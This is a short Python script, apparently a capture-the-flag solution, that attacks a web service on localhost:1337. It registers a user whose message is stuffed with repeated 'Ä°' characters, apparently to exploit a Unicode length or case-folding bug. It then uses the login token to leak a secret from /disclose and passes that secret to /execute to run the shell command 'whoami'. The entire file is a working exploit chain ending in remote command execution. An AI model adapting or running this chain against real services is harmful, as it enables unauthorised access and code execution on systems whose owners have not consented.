import requests
import string
import random

URL = "http://localhost:1337"
session = requests.Session()
username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def register():
    r = session.post(URL + "/register", data={
        "username": username,
        "password": password,
        "message": "Ä°" * 90 + "\n"
    })
    print(r.text)

def login():
    r = session.post(URL + "/login", data={
        "username": username,
        "password": password,
    })
    print(r.text)
    return r.text

def disclose(token):
    r = session.post(URL + "/disclose", headers={
        'Authorization': token
    })
    print(r.text)
    return r.text

def exploit(secret):
    r = session.post(URL + "/execute?secret="+secret, data={
        "choice": 6,
        "_": "whoami"
    });
    print(r.text)

register()
token = login()
secret = disclose(token)
exploit(secret)